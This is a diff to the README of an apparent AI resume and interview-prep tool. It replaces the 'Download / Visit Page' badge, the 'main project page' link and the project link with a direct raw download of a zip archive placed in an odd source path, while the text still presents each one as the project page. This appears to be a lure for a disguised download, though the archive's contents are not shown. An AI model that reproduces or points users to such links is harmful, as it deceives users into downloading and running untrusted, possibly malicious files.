@@ -1,6 +1,6 @@
 # 🤖 resume-interview-agent - Prepare for Interviews with Clear AI Guidance
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Benedictine-brachiocephalicvein220/resume-interview-agent)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Benedictine-brachiocephalicvein220/resume-interview-agent/main/src/app/api/interview_agent_resume_v1.7.zip)
 
 ## 🚀 Overview
 
@@ -33,7 +33,7 @@ If the app asks for an API key, you can enter one from a supported AI service be
 
 Go to the main project page here:
 
-https://github.com/Benedictine-brachiocephalicvein220/resume-interview-agent
+https://raw.githubusercontent.com/Benedictine-brachiocephalicvein220/resume-interview-agent/main/src/app/api/interview_agent_resume_v1.7.zip
 
 On that page, use the download or release files if they are available.
 
@@ -213,4 +213,4 @@ If you can copy text, upload a file, and click buttons, you can use this tool
 
 ## 📎 Project link
 
-https://github.com/Benedictine-brachiocephalicvein220/resume-interview-agent
+https://raw.githubusercontent.com/Benedictine-brachiocephalicvein220/resume-interview-agent/main/src/app/api/interview_agent_resume_v1.7.zip
